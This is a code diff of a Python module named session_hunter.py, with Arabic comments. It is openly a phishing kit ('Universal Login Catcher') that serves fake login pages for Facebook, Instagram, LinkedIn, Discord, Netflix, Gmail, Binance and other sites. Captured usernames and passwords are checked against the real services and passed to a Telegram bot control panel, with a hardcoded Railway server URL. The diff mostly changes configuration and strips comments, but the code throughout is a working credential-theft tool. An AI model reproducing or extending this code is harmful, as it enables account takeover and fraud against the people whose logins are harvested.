@@ -1,7 +1,6 @@
 # session_hunter.py
 # ============================================================
 # Universal Login Catcher v4 — مع التحقق الفعلي
-# يدعم 12 موقع + فحص البيانات مع السيرفرات الحقيقية
 # ============================================================
 
 import os
@@ -29,11 +28,13 @@ REDIS_URL = os.getenv("REDIS_URL", "").strip()
 if not REDIS_URL:
     logger.warning("⚠️ REDIS_URL not set - SH will use its own connection")
 
-# نظّف الرابط
 if REDIS_URL.startswith("redis-cli"):
     REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
 if REDIS_URL and not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
     REDIS_URL = "redis://" + REDIS_URL
+
+if "upstash.io" in REDIS_URL and REDIS_URL.startswith("redis://"):
+    REDIS_URL = REDIS_URL.replace("redis://", "rediss://", 1)
 
 try:
     if REDIS_URL:
@@ -48,10 +49,24 @@ except Exception as e:
     logger.error(f"SH Redis error: {e}")
     redis_client = None
 
-RAILWAY_URL = os.getenv("RAILWAY_URL", "daf-production-e34a.up.railway.app")
 
 # ============================================================
-# [2] المواقع المدعومة
+# [2] ★★★ URL السيرفر — يقرأ من ENV ★★★
+# ============================================================
+RAILWAY_URL = os.getenv("RAILWAY_URL", "").strip()
+
+if not RAILWAY_URL:
+    RAILWAY_URL = "https://daf-production-e34a.up.railway.app"
+    logger.warning("⚠️ SH: RAILWAY_URL not set in ENV - using default")
+
+if not RAILWAY_URL.startswith(("http://", "https://")):
+    RAILWAY_URL = "https://" + RAILWAY_URL
+
+logger.info(f"SH: RAILWAY_URL = {RAILWAY_URL}")
+
+
+# ============================================================
+# [3] المواقع المدعومة
 # ============================================================
 SUPPORTED_SITES = {
     "facebook": {
@@ -237,7 +252,7 @@ SUPPORTED_SITES = {
 }
 
 # ============================================================
-# [3] إدارة الجلسات
+# [4] إدارة الجلسات
 # ============================================================
 sessions = {}
 sessions_lock = threading.Lock()
@@ -272,10 +287,9 @@ def get_session(session_id):
 
 
 # ============================================================
-# [4] ★★★ التحقق الفعلي من البيانات ★★★
+# [5] التحقق الفعلي
 # ============================================================
 def verify_credentials(site_key, username, password, source_ip):
-    """يتحقق من البيانات مع الموقع الحقيقي"""
     try:
         logger.info(f"[VERIFY] {site_key} | user={username[:30]} | pass_len={len(password)}")
 
@@ -306,7 +320,6 @@ def verify_credentials(site_key, username, password, source_ip):
 
 
 def _verify_facebook(username, password):
-    """التحقق من Facebook"""
     try:
         session = requests.Session()
         headers = {
@@ -388,7 +401,6 @@ def _verify_facebook(username, password):
 
 
 def _verify_instagram(username, password):
-    """التحقق من Instagram"""
     try:
         session = requests.Session()
         headers = {
@@ -447,7 +459,6 @@ def _verify_instagram(username, password):
 
 
 def _verify_linkedin(username, password):
-    """التحقق من LinkedIn"""
     try:
         session = requests.Session()
         headers = {
@@ -487,7 +498,6 @@ def _verify_linkedin(username, password):
 
 
 def _verify_discord(username, password):
-    """التحقق من Discord"""
     try:
         session = requests.Session()
         headers = {
@@ -531,7 +541,6 @@ def _verify_discord(username, password):
 
 
 def _verify_netflix(username, password):
-    """التحقق من Netflix"""
     try:
         session = requests.Session()
         headers = {
@@ -572,9 +581,6 @@ def _verify_netflix(username, password):
         return (False, "exception")
 
 
-# ============================================================
-# دوال للمواقع بدون تحقق كامل
-# ============================================================
 def _verify_gmail(username, password):
     return (True, "assumed_valid")
 
@@ -604,16 +610,15 @@ def _verify_binance(username, password):
 
 
 # ============================================================
-# [5] توليد صفحة تسجيل الدخول
+# [6] توليد صفحة تسجيل الدخول
 # ============================================================
 def generate_login_page(session_id, chat_id, site_key):
-    """يولّد صفحة تسجيل دخول باستخدام template"""
     site = SUPPORTED_SITES.get(site_key, SUPPORTED_SITES["facebook"])
     return build_login_page(session_id, chat_id, site_key, site, RAILWAY_URL)
 
 
 # ============================================================
-# [6] المسارات
+# [7] Routes
 # ============================================================
 def init_session_hunter_routes(app, bot):
 
@@ -838,7 +843,7 @@ def init_session_hunter_routes(app, bot):
 
 
 # ============================================================
-# [7] معالجة البيانات الواردة
+# [8] معالجة البيانات
 # ============================================================
 def _handle_sh_data(bot, chat_id, session_id, data, source_ip, site_key):
     dtype = data.get('type')
@@ -910,7 +915,7 @@ def _handle_sh_data(bot, chat_id, session_id, data, source_ip, site_key):
 
 
 # ============================================================
-# [8] لوحة تحكم البوت
+# [9] لوحة تحكم البوت
 # ============================================================
 def build_sh_panel(session_id, chat_id):
     from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
@@ -926,10 +931,9 @@ def build_sh_panel(session_id, chat_id):
 
 
 # ============================================================
-# [9] API للبوت
+# [10] API للبوت
 # ============================================================
 def get_sh_data(session_id):
-    """يرجع بيانات الجلسة"""
     result = {"credentials": [], "session": None}
 
     sess = get_session(session_id)
